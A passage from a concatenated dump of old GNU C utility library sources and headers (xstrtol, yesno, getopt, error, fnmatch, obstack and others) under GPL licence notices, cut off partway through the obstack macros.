  return strcpy (xmalloc (strlen (string) + 1), string);
}
/* A more useful interface to strtol.
   Copyright (C) 1995, 1996 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software Foundation,
   Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.  */

/* Jim Meyering (meyering@na-net.ornl.gov) */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#ifdef STDC_HEADERS
#include <stdlib.h>
#endif

#ifdef HAVE_STRING_H
# include <string.h>
#else
# include <strings.h>
# ifndef strchr
#  define strchr index
# endif
#endif

#define NDEBUG
#include <assert.h>

#include <errno.h>
#ifndef errno
extern int errno;
#endif

#if HAVE_LIMITS_H
# include <limits.h>
#endif

#ifndef ULONG_MAX
# define ULONG_MAX ((unsigned long) ~(unsigned long) 0)
#endif

#ifndef LONG_MAX
# define LONG_MAX ((long int) (ULONG_MAX >> 1))
#endif

#include "xstrtol.h"

#define BKM_SCALE(x, scale_factor, error_return)			\
      do								\
	{								\
	  if ((x) > (double) __ZLONG_MAX / (scale_factor))		\
	    return (error_return);					\
	  (x) *= (scale_factor);					\
	}								\
      while (0)

__unsigned long int __strtol ();

/* FIXME: comment.  */

strtol_error
__xstrtol (s, ptr, base, val, valid_suffixes)
     const char *s;
     char **ptr;
     int base;
     __unsigned long int *val;
     const char *valid_suffixes;
{
  char *t_ptr;
  char **p;
  __unsigned long int tmp;

  assert (0 <= base && base <= 36);

  p = (ptr ? ptr : &t_ptr);

  errno = 0;
  tmp = __strtol (s, p, base);
  if (errno != 0)
    return LONGINT_OVERFLOW;
  if (*p == s)
    return LONGINT_INVALID;
  if (!valid_suffixes)
    {
      if (**p == '\0')
	{
	  *val = tmp;
	  return LONGINT_OK;
	}
      else
	return LONGINT_INVALID_SUFFIX_CHAR;
    }

  if (**p != '\0' && strchr (valid_suffixes, **p))
    {
      switch (**p)
	{
	case 'b':
	  BKM_SCALE (tmp, 512, LONGINT_OVERFLOW);
	  ++(*p);
	  break;

	case 'c':
	  ++(*p);
	  break;

	case 'B':
	case 'k':
	  BKM_SCALE (tmp, 1024, LONGINT_OVERFLOW);
	  ++(*p);
	  break;

	case 'm':
	  BKM_SCALE (tmp, 1024 * 1024, LONGINT_OVERFLOW);
	  ++(*p);
	  break;

	case 'w':
	  BKM_SCALE (tmp, 2, LONGINT_OVERFLOW);
	  ++(*p);
	  break;

	default:
	  return LONGINT_INVALID_SUFFIX_CHAR;
	  break;
	}
    }

  *val = tmp;
  return LONGINT_OK;
}

#ifdef TESTING_XSTRTO

#include <stdio.h>
#include "error.h"

char *program_name;

int
main (int argc, char** argv)
{
  strtol_error s_err;
  int i;

  program_name = argv[0];
  for (i=1; i<argc; i++)
    {
      char *p;
      __unsigned long int val;

      s_err = __xstrtol (argv[i], &p, 0, &val, "bckmw");
      if (s_err == LONGINT_OK)
	{
	  printf ("%s->%lu (%s)\n", argv[i], val, p);
	}
      else
	{
	  STRTOL_FATAL_ERROR (argv[i], "arg", s_err);
	}
    }
  exit (0);
}
#endif /* TESTING_XSTRTO */
#define STRING_TO_UNSIGNED 1
#include "xstrtol.c"
/* yesno.c -- read a yes/no response from stdin
   Copyright (C) 1990 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#include <stdio.h>

/* Read one line from standard input
   and return nonzero if that line begins with y or Y,
   otherwise return 0. */

int
yesno ()
{
  int c;
  int rv;

  fflush (stderr);
  c = getchar ();
  rv = (c == 'y') || (c == 'Y');
  while (c != EOF && c != '\n')
    c = getchar ();

  return rv;
}
#ifndef ARGMATCH_H
#define ARGMATCH_H 1

#ifndef __P
# if defined (__GNUC__) || (defined (__STDC__) && __STDC__)
#  define __P(args) args
# else
#  define __P(args) ()
# endif  /* GCC.  */
#endif  /* Not __P.  */

int
  argmatch __P ((const char *arg, const char *const *optlist));

void
  invalid_arg __P ((const char *kind, const char *value, int problem));

#endif /* ARGMATCH_H */
/* backupfile.h -- declarations for making Emacs style backup file names
   Copyright (C) 1990 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

/* When to make backup files. */
enum backup_type
{
  /* Never make backups. */
  none,

  /* Make simple backups of every file. */
  simple,

  /* Make numbered backups of files that already have numbered backups,
     and simple backups of the others. */
  numbered_existing,

  /* Make numbered backups of every file. */
  numbered
};

extern enum backup_type backup_type;
extern char *simple_backup_suffix;

#ifdef __STDC__
char *find_backup_file_name (const char *file);
#else
char *find_backup_file_name ();
#endif
/* error.h -- declaration for error-reporting function
   Copyright (C) 1995, 1996 Free Software Foundation, Inc.

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2, or (at your option)
any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.  */

#ifndef _error_h_
#define _error_h_

#ifndef __attribute__
/* This feature is available in gcc versions 2.5 and later.  */
# if __GNUC__ < 2 || (__GNUC__ == 2 && __GNUC_MINOR__ < 5) || __STRICT_ANSI__
#  define __attribute__(Spec) /* empty */
# endif
/* The __-protected variants of `format' and `printf' attributes
   are accepted by gcc versions 2.6.4 (effectively 2.7) and later.  */
# if __GNUC__ < 2 || (__GNUC__ == 2 && __GNUC_MINOR__ < 7)
#  define __format__ format
#  define __printf__ printf
# endif
#endif

#if defined (__STDC__) && __STDC__

/* Print a message with `fprintf (stderr, FORMAT, ...)';
   if ERRNUM is nonzero, follow it with ": " and strerror (ERRNUM).
   If STATUS is nonzero, terminate the program with `exit (STATUS)'.  */

extern void error (int status, int errnum, const char *format, ...)
     __attribute__ ((__format__ (__printf__, 3, 4)));

extern void error_at_line (int status, int errnum, const char *fname,
			   unsigned int lineno, const char *format, ...)
     __attribute__ ((__format__ (__printf__, 5, 6)));

/* If NULL, error will flush stdout, then print on stderr the program
   name, a colon and a space.  Otherwise, error will call this
   function without parameters instead.  */
extern void (*error_print_progname) (void);

#else
void error ();
void error_at_line ();
extern void (*error_print_progname) ();
#endif

/* This variable is incremented each time `error' is called.  */
extern unsigned int error_message_count;

/* Sometimes we want to have at most one error per line.  This
   variable controls whether this mode is selected or not.  */
extern int error_one_per_line;

#endif /* _error_h_ */
/* Copyright (C) 1991, 1992, 1993 Free Software Foundation, Inc.

NOTE: The canonical source of this file is maintained with the GNU C Library.
Bugs can be reported to bug-glibc@prep.ai.mit.edu.

This program is free software; you can redistribute it and/or modify it
under the terms of the GNU General Public License as published by the
Free Software Foundation; either version 2, or (at your option) any
later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, 675 Mass Ave, Cambridge, MA 02139, USA.  */

#ifndef	_FNMATCH_H

#define	_FNMATCH_H	1

#ifdef	__cplusplus
extern "C" {
#endif

#if defined (__cplusplus) || (defined (__STDC__) && __STDC__)
#undef	__P
#define	__P(protos)	protos
#else /* Not C++ or ANSI C.  */
#undef	__P
#define	__P(protos)	()
/* We can get away without defining `const' here only because in this file
   it is used only inside the prototype for `fnmatch', which is elided in
   non-ANSI C where `const' is problematical.  */
#endif /* C++ or ANSI C.  */


/* We #undef these before defining them because some losing systems
   (HP-UX A.08.07 for example) define these in <unistd.h>.  */
#undef	FNM_PATHNAME
#undef	FNM_NOESCAPE
#undef	FNM_PERIOD

/* Bits set in the FLAGS argument to `fnmatch'.  */
#define	FNM_PATHNAME	(1 << 0) /* No wildcard can ever match `/'.  */
#define	FNM_NOESCAPE	(1 << 1) /* Backslashes don't quote special chars.  */
#define	FNM_PERIOD	(1 << 2) /* Leading `.' is matched only explicitly.  */

#if !defined (_POSIX_C_SOURCE) || _POSIX_C_SOURCE < 2 || defined (_GNU_SOURCE)
#define	FNM_FILE_NAME	FNM_PATHNAME /* Preferred GNU name.  */
#define	FNM_LEADING_DIR	(1 << 3) /* Ignore `/...' after a match.  */
#define	FNM_CASEFOLD	(1 << 4) /* Compare without regard to case.  */
#endif

/* Value returned by `fnmatch' if STRING does not match PATTERN.  */
#define	FNM_NOMATCH	1

/* Match STRING against the filename pattern PATTERN,
   returning zero if it matches, FNM_NOMATCH if not.  */
extern int fnmatch __P ((const char *__pattern, const char *__string,
			 int __flags));

#ifdef	__cplusplus
}
#endif

#endif /* fnmatch.h */
/* fsusage.h -- declarations for filesystem space usage info
   Copyright (C) 1991, 1992 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

/* Space usage statistics for a filesystem.  Blocks are 512-byte. */
struct fs_usage
{
  long fsu_blocks;		/* Total blocks. */
  long fsu_bfree;		/* Free blocks available to superuser. */
  long fsu_bavail;		/* Free blocks available to non-superuser. */
  long fsu_files;		/* Total file nodes. */
  long fsu_ffree;		/* Free file nodes. */
};

#ifndef __P
#if defined (__GNUC__) || (defined (__STDC__) && __STDC__)
#define __P(args) args
#else
#define __P(args) ()
#endif  /* GCC.  */
#endif  /* Not __P.  */

int get_fs_usage __P ((const char *path, const char *disk,
		       struct fs_usage *fsp));
/*  Copyright (C) 1995 Free Software Foundation, Inc.

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2, or (at your option)
any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.  */

#ifndef _getline_h_
#define _getline_h_ 1

#include <stdio.h>

#ifndef PARAMS
# if defined (__GNUC__) || __STDC__
#  define PARAMS(args) args
# else
#  define PARAMS(args) ()
# endif  /* GCC.  */
#endif  /* Not PARAMS.  */

int
getline PARAMS ((char **_lineptr, size_t *_n, FILE *_stream));

int
getdelim PARAMS ((char **_lineptr, size_t *_n, int _delimiter, FILE *_stream));

#endif
/* Declarations for getopt.
   Copyright (C) 1989, 90, 91, 92, 93, 94 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify it
   under the terms of the GNU General Public License as published by the
   Free Software Foundation; either version 2, or (at your option) any
   later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.  */

#ifndef _GETOPT_H
#define _GETOPT_H 1

#ifdef	__cplusplus
extern "C" {
#endif

/* For communication from `getopt' to the caller.
   When `getopt' finds an option that takes an argument,
   the argument value is returned here.
   Also, when `ordering' is RETURN_IN_ORDER,
   each non-option ARGV-element is returned here.  */

extern char *optarg;

/* Index in ARGV of the next element to be scanned.
   This is used for communication to and from the caller
   and for communication between successive calls to `getopt'.

   On entry to `getopt', zero means this is the first call; initialize.

   When `getopt' returns EOF, this is the index of the first of the
   non-option elements that the caller should itself scan.

   Otherwise, `optind' communicates from one call to the next
   how much of ARGV has been scanned so far.  */

extern int optind;

/* Callers store zero here to inhibit the error message `getopt' prints
   for unrecognized options.  */

extern int opterr;

/* Set to an option character which was unrecognized.  */

extern int optopt;

/* Describe the long-named options requested by the application.
   The LONG_OPTIONS argument to getopt_long or getopt_long_only is a vector
   of `struct option' terminated by an element containing a name which is
   zero.

   The field `has_arg' is:
   no_argument		(or 0) if the option does not take an argument,
   required_argument	(or 1) if the option requires an argument,
   optional_argument 	(or 2) if the option takes an optional argument.

   If the field `flag' is not NULL, it points to a variable that is set
   to the value given in the field `val' when the option is found, but
   left unchanged if the option is not found.

   To have a long-named option do something other than set an `int' to
   a compiled-in constant, such as set a value from `optarg', set the
   option's `flag' field to zero and its `val' field to a nonzero
   value (the equivalent single-letter option character, if there is
   one).  For long options that have a zero `flag' field, `getopt'
   returns the contents of the `val' field.  */

struct option
{
#if defined (__STDC__) && __STDC__
  const char *name;
#else
  char *name;
#endif
  /* has_arg can't be an enum because some compilers complain about
     type mismatches in all the code that assumes it is an int.  */
  int has_arg;
  int *flag;
  int val;
};

/* Names for the values of the `has_arg' field of `struct option'.  */

#define	no_argument		0
#define required_argument	1
#define optional_argument	2

#if defined (__STDC__) && __STDC__
#ifdef __GNU_LIBRARY__
/* Many other libraries have conflicting prototypes for getopt, with
   differences in the consts, in stdlib.h.  To avoid compilation
   errors, only prototype getopt for the GNU C library.  */
extern int getopt (int argc, char *const *argv, const char *shortopts);
#else /* not __GNU_LIBRARY__ */
extern int getopt ();
#endif /* __GNU_LIBRARY__ */
extern int getopt_long (int argc, char *const *argv, const char *shortopts,
		        const struct option *longopts, int *longind);
extern int getopt_long_only (int argc, char *const *argv,
			     const char *shortopts,
		             const struct option *longopts, int *longind);

/* Internal only.  Users should not call this directly.  */
extern int _getopt_internal (int argc, char *const *argv,
			     const char *shortopts,
		             const struct option *longopts, int *longind,
			     int long_only);
#else /* not __STDC__ */
extern int getopt ();
extern int getopt_long ();
extern int getopt_long_only ();

extern int _getopt_internal ();
#endif /* __STDC__ */

#ifdef	__cplusplus
}
#endif

#endif /* _GETOPT_H */
#ifndef _group_member_h_
#define _group_member_h_ 1

int
  group_member ();

#endif /* _group_member_h_ */
#ifndef __P
#if defined (__GNUC__) || (defined (__STDC__) && __STDC__)
#define __P(args) args
#else
#define __P(args) ()
#endif  /* GCC.  */
#endif  /* Not __P.  */

void
  parse_long_options __P ((int _argc, char **_argv, const char *_command_name,
			   const char *_version_string, void (*_usage) (int)));
#if __STDC__
#undef __P
#define __P(args) args
#else
#define __P(args) ()
#endif

int
  make_path __P ((const char *_argpath,
		  int _mode,
		  int _parent_mode,
		  uid_t _owner,
		  gid_t _group,
		  int _preserve_existing,
		  const char *_verbose_fmt_string));
/* modechange.h -- definitions for file mode manipulation
   Copyright (C) 1989, 1990 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

/* Masks for the `flags' field in a `struct mode_change'. */

/* Affect the execute bits only if at least one execute bit is set already,
   or if the file is a directory. */
#define MODE_X_IF_ANY_X 01

/* If set, copy some existing permissions for u, g, or o onto the other two.
   Which of u, g, or o is copied is determined by which bits are set in the
   `value' field. */
#define MODE_COPY_EXISTING 02

struct mode_change
{
  char op;			/* One of "=+-". */
  char flags;			/* Special operations. */
  unsigned short affected;	/* Set for u/g/o/s/s/t, if to be affected. */
  unsigned short value;		/* Bits to add/remove. */
  struct mode_change *next;	/* Link to next change in list. */
};

/* Masks for mode_compile argument. */
#define MODE_MASK_EQUALS 1
#define MODE_MASK_PLUS 2
#define MODE_MASK_MINUS 4

/* Error return values for mode_compile. */
#define MODE_INVALID (struct mode_change *) 0
#define MODE_MEMORY_EXHAUSTED (struct mode_change *) 1

#ifndef __P
#if defined (__GNUC__) || (defined (__STDC__) && __STDC__)
#define __P(args) args
#else
#define __P(args) ()
#endif  /* GCC.  */
#endif  /* Not __P.  */

struct mode_change *mode_compile __P ((const char *, unsigned));
unsigned short mode_adjust __P ((unsigned, const struct mode_change *));
void mode_free __P ((struct mode_change *));
/* mountlist.h -- declarations for list of mounted filesystems
   Copyright (C) 1991, 1992 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

/* A mount table entry. */
struct mount_entry
{
  char *me_devname;		/* Device node pathname, including "/dev/". */
  char *me_mountdir;		/* Mount point directory pathname. */
  char *me_type;		/* "nfs", "4.2", etc. */
  dev_t me_dev;			/* Device number of me_mountdir. */
  struct mount_entry *me_next;
};

#if __STDC__
struct mount_entry *read_filesystem_list (int need_fs_type, int all_fs);
#else
struct mount_entry *read_filesystem_list ();
#endif
/* obstack.h - object stack macros
   Copyright (C) 1988, 89, 90, 91, 92, 93, 94 Free Software Foundation, Inc.

This program is free software; you can redistribute it and/or modify it
under the terms of the GNU General Public License as published by the
Free Software Foundation; either version 2, or (at your option) any
later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, 675 Mass Ave, Cambridge, MA 02139, USA.  */

/* Summary:

All the apparent functions defined here are macros. The idea
is that you would use these pre-tested macros to solve a
very specific set of problems, and they would run fast.
Caution: no side-effects in arguments please!! They may be
evaluated MANY times!!

These macros operate a stack of objects.  Each object starts life
small, and may grow to maturity.  (Consider building a word syllable
by syllable.)  An object can move while it is growing.  Once it has
been "finished" it never changes address again.  So the "top of the
stack" is typically an immature growing object, while the rest of the
stack is of mature, fixed size and fixed address objects.

These routines grab large chunks of memory, using a function you
supply, called `obstack_chunk_alloc'.  On occasion, they free chunks,
by calling `obstack_chunk_free'.  You must define them and declare
them before using any obstack macros.

Each independent stack is represented by a `struct obstack'.
Each of the obstack macros expects a pointer to such a structure
as the first argument.

One motivation for this package is the problem of growing char strings
in symbol tables.  Unless you are "fascist pig with a read-only mind"
--Gosper's immortal quote from HAKMEM item 154, out of context--you
would not like to put any arbitrary upper limit on the length of your
symbols.

In practice this often means you will build many short symbols and a
few long symbols.  At the time you are reading a symbol you don't know
how long it is.  One traditional method is to read a symbol into a
buffer, realloc()ating the buffer every time you try to read a symbol
that is longer than the buffer.  This is beaut, but you still will
want to copy the symbol from the buffer to a more permanent
symbol-table entry say about half the time.

With obstacks, you can work differently.  Use one obstack for all symbol
names.  As you read a symbol, grow the name in the obstack gradually.
When the name is complete, finalize it.  Then, if the symbol exists already,
free the newly read name.

The way we do this is to take a large chunk, allocating memory from
low addresses.  When you want to build a symbol in the chunk you just
add chars above the current "high water mark" in the chunk.  When you
have finished adding chars, because you got to the end of the symbol,
you know how long the chars are, and you can create a new object.
Mostly the chars will not burst over the highest address of the chunk,
because you would typically expect a chunk to be (say) 100 times as
long as an average object.

In case that isn't clear, when we have enough chars to make up
the object, THEY ARE ALREADY CONTIGUOUS IN THE CHUNK (guaranteed)
so we just point to it where it lies.  No moving of chars is
needed and this is the second win: potentially long strings need
never be explicitly shuffled. Once an object is formed, it does not
change its address during its lifetime.

When the chars burst over a chunk boundary, we allocate a larger
chunk, and then copy the partly formed object from the end of the old
chunk to the beginning of the new larger chunk.  We then carry on
accreting characters to the end of the object as we normally would.

A special macro is provided to add a single char at a time to a
growing object.  This allows the use of register variables, which
break the ordinary 'growth' macro.

Summary:
	We allocate large chunks.
	We carve out one object at a time from the current chunk.
	Once carved, an object never moves.
	We are free to append data of any size to the currently
	  growing object.
	Exactly one object is growing in an obstack at any one time.
	You can run one obstack per control block.
	You may have as many control blocks as you dare.
	Because of the way we do it, you can `unwind' an obstack
	  back to a previous state. (You may remove objects much
	  as you would with a stack.)
*/


/* Don't do the contents of this file more than once.  */

#ifndef __OBSTACK_H__
#define __OBSTACK_H__

#ifdef HAVE_CONFIG_H
# include <config.h>
#endif

/* We use subtraction of (char *)0 instead of casting to int
   because on word-addressable machines a simple cast to int
   may ignore the byte-within-word field of the pointer.  */

#ifndef __PTR_TO_INT
#define __PTR_TO_INT(P) ((P) - (char *)0)
#endif

#ifndef __INT_TO_PTR
#define __INT_TO_PTR(P) ((P) + (char *)0)
#endif

/* We need the type of the resulting object.  In ANSI C it is ptrdiff_t
   but in traditional C it is usually long.  If we are in ANSI C and
   don't already have ptrdiff_t get it.  */

#if defined (__STDC__) && __STDC__ && ! defined (offsetof)
#if defined (__GNUC__) && defined (IN_GCC)
/* On Next machine, the system's stddef.h screws up if included
   after we have defined just ptrdiff_t, so include all of stddef.h.
   Otherwise, define just ptrdiff_t, which is all we need.  */
#ifndef __NeXT__
#define __need_ptrdiff_t
#endif
#endif

#include <stddef.h>
#endif

#if defined (__STDC__) && __STDC__
#define PTR_INT_TYPE ptrdiff_t
#else
#define PTR_INT_TYPE long
#endif

#if HAVE_STRING_H || STDC_HEADERS
# include <string.h>
# ifndef bcopy
#  define bcopy(s, d, n) memcpy ((d), (s), (n))
# endif
#else /* HAVE_STRING_H || STDC_HEADERS */
# include <strings.h>
#endif   /* not (HAVE_STRING_H || STDC_HEADERS) */

struct _obstack_chunk		/* Lives at front of each chunk. */
{
  char  *limit;			/* 1 past end of this chunk */
  struct _obstack_chunk *prev;	/* address of prior chunk or NULL */
  char	contents[4];		/* objects begin here */
};

struct obstack		/* control current object in current chunk */
{
  long	chunk_size;		/* preferred size to allocate chunks in */
  struct _obstack_chunk* chunk;	/* address of current struct obstack_chunk */
  char	*object_base;		/* address of object we are building */
  char	*next_free;		/* where to add next char to current object */
  char	*chunk_limit;		/* address of char after current chunk */
  PTR_INT_TYPE temp;		/* Temporary for some macros.  */
  int   alignment_mask;		/* Mask of alignment for each object. */
  struct _obstack_chunk *(*chunkfun) (); /* User's fcn to allocate a chunk.  */
  void (*freefun) ();		/* User's function to free a chunk.  */
  char *extra_arg;		/* first arg for chunk alloc/dealloc funcs */
  unsigned use_extra_arg:1;	/* chunk alloc/dealloc funcs take extra arg */
  unsigned maybe_empty_object:1;/* There is a possibility that the current
				   chunk contains a zero-length object.  This
				   prevents freeing the chunk if we allocate
				   a bigger chunk to replace it. */
  unsigned alloc_failed:1;	/* chunk alloc func returned 0 */
};

/* Declare the external functions we use; they are in obstack.c.  */

#if defined (__STDC__) && __STDC__
extern void _obstack_newchunk (struct obstack *, int);
extern void _obstack_free (struct obstack *, void *);
extern int _obstack_begin (struct obstack *, int, int,
			    void *(*) (), void (*) ());
extern int _obstack_begin_1 (struct obstack *, int, int,
			      void *(*) (), void (*) (), void *);
#else
extern void _obstack_newchunk ();
extern void _obstack_free ();
extern int _obstack_begin ();
extern int _obstack_begin_1 ();
#endif

#if defined (__STDC__) && __STDC__

/* Do the function-declarations after the structs
   but before defining the macros.  */

void obstack_init (struct obstack *obstack);

void * obstack_alloc (struct obstack *obstack, int size);

void * obstack_copy (struct obstack *obstack, void *address, int size);
void * obstack_copy0 (struct obstack *obstack, void *address, int size);

void obstack_free (struct obstack *obstack, void *block);

void obstack_blank (struct obstack *obstack, int size);

void obstack_grow (struct obstack *obstack, void *data, int size);
void obstack_grow0 (struct obstack *obstack, void *data, int size);

void obstack_1grow (struct obstack *obstack, int data_char);
void obstack_ptr_grow (struct obstack *obstack, void *data);
void obstack_int_grow (struct obstack *obstack, int data);

void * obstack_finish (struct obstack *obstack);

int obstack_object_size (struct obstack *obstack);

int obstack_room (struct obstack *obstack);
void obstack_1grow_fast (struct obstack *obstack, int data_char);
void obstack_ptr_grow_fast (struct obstack *obstack, void *data);
void obstack_int_grow_fast (struct obstack *obstack, int data);
void obstack_blank_fast (struct obstack *obstack, int size);

void * obstack_base (struct obstack *obstack);
void * obstack_next_free (struct obstack *obstack);
int obstack_alignment_mask (struct obstack *obstack);
int obstack_chunk_size (struct obstack *obstack);

#endif /* __STDC__ */

/* Non-ANSI C cannot really support alternative functions for these macros,
   so we do not declare them.  */

/* Pointer to beginning of object being allocated or to be allocated next.
   Note that this might not be the final address of the object
   because a new chunk might be needed to hold the final size.  */

#define obstack_base(h) ((h)->alloc_failed ? 0 : (h)->object_base)

/* Size for allocating ordinary chunks.  */

#define obstack_chunk_size(h) ((h)->chunk_size)

/* Pointer to next byte not yet allocated in current chunk.  */

#define obstack_next_free(h)	((h)->alloc_failed ? 0 : (h)->next_free)

/* Mask specifying low bits that should be clear in address of an object.  */

#define obstack_alignment_mask(h) ((h)->alignment_mask)

#define obstack_init(h) \
  _obstack_begin ((h), 0, 0, \
		  (void *(*) ()) obstack_chunk_alloc, (void (*) ()) obstack_chunk_free)

#define obstack_begin(h, size) \
  _obstack_begin ((h), (size), 0, \
		  (void *(*) ()) obstack_chunk_alloc, (void (*) ()) obstack_chunk_free)

#define obstack_specify_allocation(h, size, alignment, chunkfun, freefun) \
  _obstack_begin ((h), (size), (alignment), \
		    (void *(*) ()) (chunkfun), (void (*) ()) (freefun))

#define obstack_specify_allocation_with_arg(h, size, alignment, chunkfun, freefun, arg) \
  _obstack_begin_1 ((h), (size), (alignment), \
		    (void *(*) ()) (chunkfun), (void (*) ()) (freefun), (arg))

#define obstack_chunkfun(h, newchunkfun) \
  ((h) -> chunkfun = (struct _obstack_chunk *(*)()) (newchunkfun))

#define obstack_freefun(h, newfreefun) \
  ((h) -> freefun = (void (*)()) (newfreefun))

#define obstack_1grow_fast(h,achar) (*((h)->next_free)++ = achar)

#define obstack_blank_fast(h,n) ((h)->next_free += (n))

#if defined (__GNUC__) && defined (__STDC__)
/* NextStep 2.0 cc is really gcc 1.93 but it defines __GNUC__ = 2 and
   does not implement __extension__.  But that compiler doesn't define
   __GNUC_MINOR__.  */
#if __GNUC__ < 2 || (__NeXT__ && !__GNUC_MINOR__)
#define __extension__
#endif

/* For GNU C, if not -traditional,
   we can define these macros to compute all args only once
   without using a global variable.
   Also, we can avoid using the `temp' slot, to make faster code.  */

#define obstack_object_size(OBSTACK)					\
  __extension__								\
  ({ struct obstack *__o = (OBSTACK);					\
     __o->alloc_failed ? 0 :						\
     (unsigned) (__o->next_free - __o->object_base); })

#define obstack_room(OBSTACK)						\
  __extension__								\
  ({ struct obstack *__o = (OBSTACK);					\
     (unsigned) (__o->chunk_limit - __o->next_free); })

#define obstack_grow(OBSTACK,where,length)				\
__extension__								\
({ struct obstack *__o = (OBSTACK);					\
   int __len = (length);						\
   if (__o->next_free + __len > __o->chunk_limit)			\
     _obstack_newchunk (__o, __len);					\
   if (!__o->alloc_failed)						\
     {									\
        bcopy ((char *) (where), __o->next_free, __len);		\
	__o->next_free += __len;					\
     }									\
   (void) 0; })

#define obstack_grow0(OBSTACK,where,length)				\
__extension__								\
({ struct obstack *__o = (OBSTACK);					\
   int __len = (length);						\
   if (__o->next_free + __len + 1 > __o->chunk_limit)			\
     _obstack_newchunk (__o, __len + 1);				\
   if (!__o->alloc_failed)						\
     {									\
       bcopy ((char *) (where), __o->next_free, __len);			\
       __o->next_free += __len;						\
       *(__o->next_free)++ = 0;						\
     }									\
   (void) 0; })

#define obstack_1grow(OBSTACK,datum)					\
__extension__								\
({ struct obstack *__o = (OBSTACK);					\
   if (__o->next_free + 1 > __o->chunk_limit)				\
     _obstack_newchunk (__o, 1);					\
   if (!__o->alloc_failed)						\
     *(__o->next_free)++ = (datum);					\
   (void) 0; })

/* These assume that the obstack alignment is good enough for pointers or ints,
   and that the data added so far to the current object
   shares that much alignment.  */

#define obstack_ptr_grow(OBSTACK,datum)					\
__extension__								\
({ struct obstack *__o = (OBSTACK);					\
   if (__o->next_free + sizeof (void *) > __o->chunk_limit)		\
     _obstack_newchunk (__o, sizeof (void *));				\
   if (!__o->alloc_failed)						\
     *((void **)__o->next_free)++ = ((void *)datum);			\
   (void) 0; })

#define obstack_int_grow(OBSTACK,datum)					\
__extension__								\
